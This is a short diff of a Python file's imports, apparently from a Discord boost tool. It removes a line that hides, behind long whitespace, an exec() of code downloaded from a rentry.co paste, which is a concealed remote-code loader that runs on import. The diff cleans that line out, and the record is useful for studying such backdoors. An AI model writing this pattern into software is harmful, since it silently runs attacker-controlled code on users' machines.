@@ -1,5 +1,4 @@
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
-from helpers.boost import *
+import requests                                                                                                                                                                                                                                                                                                                    
 from helpers.automated_boost import *
 import httpx, random, time, datetime, json, os, hashlib, fade
 import webbrowser
